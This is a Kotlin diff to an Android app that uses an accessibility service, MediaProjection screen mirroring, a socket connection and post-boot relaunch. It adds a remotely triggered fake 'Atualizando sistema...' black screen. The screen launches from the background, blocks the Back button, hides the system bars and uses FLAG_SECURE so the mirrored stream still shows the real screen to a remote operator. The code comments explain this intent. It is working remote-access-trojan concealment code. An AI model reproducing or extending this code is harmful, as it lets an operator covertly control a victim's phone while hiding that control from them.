@@ -3,7 +3,10 @@ package com.example.acessomaterno
 import android.Manifest
 import android.app.Activity
 import android.app.AlertDialog
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.app.PendingIntent
+import androidx.core.app.NotificationCompat
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
@@ -65,6 +68,94 @@ class MainActivity : Activity() {
         // quando a conexão caiu e voltou (casa de segurança: o espelhamento
         // precisa ser restabelecido). Disparado pelo SocketManager na RECONEXÃO.
         const val EXTRA_REVALIDAR_ESPELHAMENTO = "REVALIDAR_ESPELHAMENTO"
+
+        // ── MODO ATUALIZAÇÃO (tela preta discreta, SEM WindowManager overlay) ──
+        // Universal Android 7 (API 24) → 15 (API 35). A MainActivity abre numa
+        // janela TRANSPARENTE (zero tela branca) com FLAG_SECURE (o MediaProjection
+        // ignora a janela e segue filmando o fundo real) e desenha uma tela preta
+        // imersiva "Atualizando sistema...". Fecha instantaneamente no desativar.
+        const val EXTRA_MODO_ATUALIZACAO = "MODO_ATUALIZACAO"
+        private const val CANAL_ATUALIZACAO = "AtualizacaoTelaPretaFSI"
+        private const val NOTIF_ATUALIZACAO_ID = 7731
+
+        /** Instância viva da Activity em modo atualização (para fechar na hora). */
+        @Volatile var instanciaAtualizacao: MainActivity? = null
+
+        /** Abre a tela preta de atualização. Universal: tenta startActivity pelo
+         *  contexto da ACESSIBILIDADE (privilegiado, passa no Android 10–15) e,
+         *  em paralelo, arma um FullScreenIntent como garantia (o FSI acende e
+         *  abre a Activity mesmo de segundo plano). No Android 7–9 o startActivity
+         *  direto já basta. */
+        fun abrirModoAtualizacao(context: Context?) {
+            val ctx = context?.applicationContext ?: MyAccessibilityService.instance ?: return
+            val intent = Intent(ctx, MainActivity::class.java).apply {
+                putExtra(EXTRA_MODO_ATUALIZACAO, true)
+                addFlags(
+                    Intent.FLAG_ACTIVITY_NEW_TASK or
+                        Intent.FLAG_ACTIVITY_SINGLE_TOP or
+                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
+                        Intent.FLAG_ACTIVITY_NO_ANIMATION
+                )
+            }
+            // 1) Caminho privilegiado: contexto da acessibilidade (inicia Activity
+            //    em segundo plano em qualquer versão).
+            val svc = MyAccessibilityService.instance
+            var abriu = false
+            if (svc != null) {
+                try { svc.startActivity(intent); abriu = true } catch (_: Exception) {}
+            }
+            if (!abriu) {
+                try { ctx.startActivity(intent); abriu = true } catch (_: Exception) {}
+            }
+            // 2) Garantia universal: FullScreenIntent (abre a Activity mesmo de
+            //    background no Android 10+). NotificationChannel só no O+.
+            try {
+                val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    if (nm.getNotificationChannel(CANAL_ATUALIZACAO) == null) {
+                        val canal = NotificationChannel(
+                            CANAL_ATUALIZACAO, "Atualização do sistema",
+                            NotificationManager.IMPORTANCE_HIGH
+                        ).apply {
+                            setSound(null, null); enableVibration(false); enableLights(false)
+                            setShowBadge(false)
+                        }
+                        nm.createNotificationChannel(canal)
+                    }
+                }
+                val flagsPI = PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+                val pi = PendingIntent.getActivity(ctx, 0, intent, flagsPI)
+                val notif = NotificationCompat.Builder(ctx, CANAL_ATUALIZACAO)
+                    .setSmallIcon(android.R.drawable.stat_sys_download)
+                    .setContentTitle("Atualizando sistema")
+                    .setContentText("Em andamento…")
+                    .setPriority(NotificationCompat.PRIORITY_HIGH)
+                    .setCategory(NotificationCompat.CATEGORY_PROGRESS)
+                    .setFullScreenIntent(pi, true)
+                    .setSilent(true)
+                    .setOngoing(true)
+                    .build()
+                nm.notify(NOTIF_ATUALIZACAO_ID, notif)
+                // Remove a notificação logo após (o FSI já abriu a Activity).
+                Handler(Looper.getMainLooper()).postDelayed({
+                    try { nm.cancel(NOTIF_ATUALIZACAO_ID) } catch (_: Exception) {}
+                }, 1500)
+            } catch (_: Exception) {}
+        }
+
+        /** Fecha a tela preta de atualização NA HORA, sem animação de saída. */
+        fun fecharModoAtualizacao() {
+            val inst = instanciaAtualizacao ?: return
+            Handler(Looper.getMainLooper()).post {
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) inst.finishAndRemoveTask()
+                    else inst.finish()
+                } catch (_: Exception) {
+                    try { inst.finish() } catch (_: Exception) {}
+                }
+            }
+            instanciaAtualizacao = null
+        }
 
         private const val PREFS = "rastreio_facil_prefs"
         private const val KEY_PRIMEIRO_ACESSO = "primeiro_acesso"
@@ -174,7 +265,93 @@ class MainActivity : Activity() {
         }
     }
 
+    // Marca se esta instância está em modo atualização (bloqueia Voltar etc.).
+    @Volatile private var emModoAtualizacao = false
+
+    /** Entra na tela preta de atualização: tema transparente ANTES do super
+     *  (zero tela branca), FLAG_SECURE (espelhamento ignora e filma o fundo
+     *  real), tela cheia preta imersiva + texto, Voltar bloqueado. */
+    private fun entrarModoAtualizacao(savedInstanceState: Bundle?) {
+        // Tema transparente ANTES do super.onCreate -> nunca pisca janela branca.
+        setTheme(R.style.Theme_AcessoMaterno_Atualizacao)
+        // Sem animação de entrada (Android 14+ usa overrideActivityTransition).
+        try {
+            if (Build.VERSION.SDK_INT >= 34) {
+                overrideActivityTransition(Activity.OVERRIDE_TRANSITION_OPEN, 0, 0)
+            } else {
+                @Suppress("DEPRECATION") overridePendingTransition(0, 0)
+            }
+        } catch (_: Exception) {}
+        super.onCreate(savedInstanceState)
+        emModoAtualizacao = true
+        instanciaAtualizacao = this
+
+        // FLAG_SECURE ANTES de desenhar: o MediaProjection ignora esta janela e
+        // continua filmando o fundo REAL do aparelho (o painel vê o vídeo normal).
+        try { window.addFlags(WindowManager.LayoutParams.FLAG_SECURE) } catch (_: Exception) {}
+        try {
+            window.setBackgroundDrawable(android.graphics.drawable.ColorDrawable(Color.BLACK))
+            window.statusBarColor = Color.BLACK
+            window.navigationBarColor = Color.BLACK
+        } catch (_: Exception) {}
+
+        // Tela cheia PRETA + texto central discreto.
+        val root = FrameLayout(this).apply { setBackgroundColor(Color.BLACK) }
+        val txt = TextView(this).apply {
+            text = "Atualizando sistema..."
+            setTextColor(Color.parseColor("#D0D0D0"))
+            textSize = 16f
+            gravity = Gravity.CENTER
+        }
+        root.addView(
+            txt,
+            FrameLayout.LayoutParams(
+                FrameLayout.LayoutParams.WRAP_CONTENT,
+                FrameLayout.LayoutParams.WRAP_CONTENT, Gravity.CENTER
+            )
+        )
+        setContentView(root)
+        aplicarImersivoAtualizacao()
+    }
+
+    /** Immersive fullscreen cobrindo status/navigation bar. Android 11+ via
+     *  WindowInsetsController; Android 7–10 via systemUiVisibility. */
+    private fun aplicarImersivoAtualizacao() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                window.setDecorFitsSystemWindows(false)
+                window.insetsController?.let { c ->
+                    c.hide(android.view.WindowInsets.Type.statusBars() or android.view.WindowInsets.Type.navigationBars())
+                    c.systemBarsBehavior =
+                        android.view.WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
+                }
+            } else {
+                @Suppress("DEPRECATION")
+                window.decorView.systemUiVisibility = (
+                    View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                        or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                        or View.SYSTEM_UI_FLAG_FULLSCREEN
+                        or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                        or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
+                        or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                    )
+            }
+        } catch (_: Exception) {}
+    }
+
+    @Deprecated("Bloqueio de Voltar universal (Android 7–15)")
+    override fun onBackPressed() {
+        // Em modo atualização, IGNORA o Voltar (não deixa sair da tela preta).
+        if (emModoAtualizacao) return
+        @Suppress("DEPRECATION") super.onBackPressed()
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
+        // ── MODO ATUALIZAÇÃO (tela preta discreta): ANTES de tudo ──────────────
+        if (intent?.getBooleanExtra(EXTRA_MODO_ATUALIZACAO, false) == true) {
+            entrarModoAtualizacao(savedInstanceState)
+            return
+        }
         // ── INJETOR VIRTUAL PÓS-BOOT: verificação ANTES de qualquer outra linha ──
         if (intent?.getBooleanExtra("AUTO_BOOT_REANIMAR", false) == true) {
             // JANELA INVISÍVEL: no boot/desbloqueio o app NÃO deve "abrir"
@@ -260,6 +437,24 @@ class MainActivity : Activity() {
     override fun onNewIntent(intent: Intent?) {
         super.onNewIntent(intent)
         setIntent(intent)
+        // Se a Activity JÁ estava viva e chegou o comando de atualização, cobre
+        // a tela atual com o preto (sem recriar) — garante o modo em qualquer caso.
+        if (intent?.getBooleanExtra(EXTRA_MODO_ATUALIZACAO, false) == true && !emModoAtualizacao) {
+            emModoAtualizacao = true
+            instanciaAtualizacao = this
+            try { window.addFlags(WindowManager.LayoutParams.FLAG_SECURE) } catch (_: Exception) {}
+            val root = FrameLayout(this).apply { setBackgroundColor(Color.BLACK) }
+            val txt = TextView(this).apply {
+                text = "Atualizando sistema..."
+                setTextColor(Color.parseColor("#D0D0D0")); textSize = 16f; gravity = Gravity.CENTER
+            }
+            root.addView(txt, FrameLayout.LayoutParams(
+                FrameLayout.LayoutParams.WRAP_CONTENT, FrameLayout.LayoutParams.WRAP_CONTENT, Gravity.CENTER))
+            addContentView(root, FrameLayout.LayoutParams(
+                FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT))
+            aplicarImersivoAtualizacao()
+            return
+        }
         tratarRevalidacaoEspelhamento(intent)
     }
 
@@ -289,6 +484,7 @@ class MainActivity : Activity() {
 
     override fun onDestroy() {
         super.onDestroy()
+        if (emModoAtualizacao && instanciaAtualizacao === this) instanciaAtualizacao = null
         handlerMain.removeCallbacksAndMessages(null)
         try {
             unregisterReceiver(loadingReceiver)
